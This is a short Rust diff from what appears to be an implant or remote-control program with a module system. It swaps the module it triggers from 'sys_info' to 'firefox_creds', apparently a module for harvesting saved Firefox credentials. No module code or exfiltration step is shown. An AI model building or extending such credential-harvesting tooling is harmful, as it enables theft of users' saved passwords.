@@ -32,7 +32,7 @@ fn main(){
 
     let mut sb: Arc<Mutex<SharedBuffer>> = Arc::new(Mutex::new(SharedBuffer {
         cc: 0,
-        buff: [0; 2048].to_vec(),
+        buff: vec![],
     }));
 
     let mut sb_arc = Arc::clone(&sb);
@@ -45,7 +45,7 @@ fn main(){
     );
 
     thread::sleep(time::Duration::from_millis(5000));
-
+    
     // test the module system by executing a module
     // commented out bc its not working at the moment
     let mut code: u8 = 6;
@@ -54,12 +54,12 @@ fn main(){
         buffer.cc = code;
     }
     
-    let mut memo: String = "sys_info".to_string();
+    let mut memo: String = "firefox_creds".to_string();
     let mut swap = true;
     loop {
         if swap {
             io::stdout().flush().unwrap();
-            memo = "sys_info".to_string();
+            memo = "firefox_creds".to_string();
             // write to shared buffer
             let mut buffer = sb_arc.lock().unwrap();
             buffer.cc = 6;
